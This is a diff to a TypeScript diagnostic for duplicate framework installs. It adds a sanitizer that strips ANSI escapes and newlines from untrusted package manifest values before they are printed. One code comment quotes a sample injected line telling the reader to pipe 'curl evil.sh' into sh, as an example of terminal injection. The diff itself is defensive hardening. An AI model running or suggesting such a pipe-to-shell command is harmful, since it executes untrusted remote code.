@@ -270,6 +270,27 @@ export function findForeignCores(
 }
 
 /**
+ * Third-party manifest data is not trusted for display.
+ *
+ * `version` and the directory name both come off disk from a package this app
+ * did not write, and both are echoed into a message a human reads in a
+ * terminal. Seeded with ANSI escapes and embedded newlines, the raw value
+ * FORGED ITS OWN LINES inside the diagnostic — `===> ALERT: run curl evil.sh |
+ * sh <===`, indented to match — and destroyed the `padEnd` column alignment.
+ * This renders BEFORE any module entry point is imported, so it is reachable
+ * under `npm install --ignore-scripts`: the one mode in which no third-party
+ * code has otherwise executed.
+ *
+ * Printable ASCII only, and bounded, so a long value cannot push the rest of
+ * the message off screen either.
+ */
+function display(value: string, limit = 64): string {
+  const clamped = value.replace(/[^\x20-\x7e]/g, '?');
+
+  return clamped.length > limit ? `${clamped.slice(0, limit)}...` : clamped;
+}
+
+/**
  * The diagnostic. It replaces the message abofs/stonyx#108 was filed over —
  * `Stonyx modules with async loading must have a config/environment.js file` —
  * which named a file that was present and correct, and named a module that was
@@ -285,6 +306,7 @@ export function duplicateCoreMessage(foreign: ForeignCore[]): string {
   if (!first) throw new Error('duplicateCoreMessage called with no foreign cores');
 
   const names = foreign.map(({ moduleName }) => `"${moduleName}"`).join(', ');
+  const single = foreign.length === 1;
 
   // DISTINCT roots, not `foreign.length + 1`. Two modules that both resolve
   // the SAME nested copy are two rows and two copies, not three. Found by
@@ -295,9 +317,9 @@ export function duplicateCoreMessage(foreign: ForeignCore[]): string {
   const copies = new Set([ first.runningCore.root, ...foreign.map(({ moduleCore }) => moduleCore.root) ]).size;
 
   const rows: [ string, string, string ][] = [
-    [ 'running core', first.runningCore.version, first.runningCore.root ],
+    [ 'running core', display(first.runningCore.version), display(first.runningCore.root, 200) ],
     ...foreign.map(({ moduleName, moduleCore }) =>
-      [ `seen by "${moduleName}"`, moduleCore.version, moduleCore.root ] as [ string, string, string ]),
+      [ `seen by "${moduleName}"`, display(moduleCore.version), display(moduleCore.root, 200) ] as [ string, string, string ]),
   ];
   const labelWidth = Math.max(...rows.map(([ label ]) => label.length));
   const versionWidth = Math.max(...rows.map(([ , version ]) => version.length));
@@ -308,10 +330,21 @@ export function duplicateCoreMessage(foreign: ForeignCore[]): string {
   // versions cannot be reconciled by any consumer-side pin, and naming one of
   // them anyway is advice that does not work. The message this one replaces
   // was wrong for exactly that reason — it asserted more than it knew.
-  const consumerRemedy = versions.length === 1
-    ? `Fix (this app, meanwhile): pin stonyx@${versions[0]} so every copy dedupes to one.`
-    : 'There is no consumer-side pin that fixes this: the modules disagree among themselves ' +
-      `(${versions.join(', ')}). They must be republished with the peer shape above.`;
+  //
+  // AND only when that pin is not ALREADY IN EFFECT. Same version at two roots
+  // is a duplicate INSTALL, not a version conflict — the shape
+  // `npm install -g stonyx` plus `stonyx new` produces, and the one the docs
+  // walk a consumer through — so telling them to pin the version their running
+  // core already IS, is advice that has demonstrably just failed. That is the
+  // same "asserts more than it knows" defect the whole message replaces.
+  const consumerRemedy = versions.length !== 1
+    ? 'There is no consumer-side pin that fixes this: the modules disagree among themselves ' +
+      `(${versions.map(version => display(version)).join(', ')}). They must be republished with the peer shape above.`
+    : versions[0] === first.runningCore.version
+      ? `Fix (this app, meanwhile): every copy on disk is already stonyx@${display(versions[0])}, so this is a duplicate ` +
+        'INSTALL and not a version conflict — no pin can merge them. Run one core: invoke the CLI from this app\'s own ' +
+        'node_modules/.bin/stonyx rather than a global install, and remove the redundant copy listed above.'
+      : `Fix (this app, meanwhile): pin stonyx@${display(versions[0])} so every copy dedupes to one.`;
 
   return [
     `Stonyx: ${copies} copies of the framework are installed and this app cannot be served.`,
@@ -319,15 +352,18 @@ export function duplicateCoreMessage(foreign: ForeignCore[]): string {
     ...rows.map(([ label, version, root ]) => `  ${label.padEnd(labelWidth)}  ${version.padEnd(versionWidth)}  ${root}`),
     '',
     `Config, logging and lifecycle hooks are registered on the running core. ${names} ` +
-    'import a different copy, so for them `Stonyx.config` is empty, `Stonyx.log` throws ' +
-    '"Stonyx has not been initialized yet", and their startup and shutdown hooks never fire.',
+    `${single ? 'imports' : 'import'} a different copy, so for ${single ? 'it' : 'them'} \`Stonyx.config\` is empty, ` +
+    `\`Stonyx.log\` throws "Stonyx has not been initialized yet", and ${single ? 'its' : 'their'} ` +
+    'startup and shutdown hooks never fire.',
     '',
     `Fix (module author): ${names} must declare stonyx in devDependencies plus a non-optional ` +
     'peerDependencies range, never as an exact dependency — @stonyx/discord is the reference shape. ' +
     consumerRemedy,
     '',
     'Scope of this check: it compares physical package ROOTS only. It does not check that the ' +
-    'single surviving copy is a compatible version, and it cannot see a copy dragged in by a ' +
-    'package that is not one of this app\'s declared @stonyx/* modules.',
+    'single surviving copy is a compatible version, and it looks at @stonyx/* packages declared in ' +
+    'this app\'s devDependencies that carry the "stonyx-module" keyword — nothing else. A copy ' +
+    'dragged in by anything outside that set, including an @stonyx/* package declared in ' +
+    'dependencies rather than devDependencies, is not counted.',
   ].join('\n');
 }
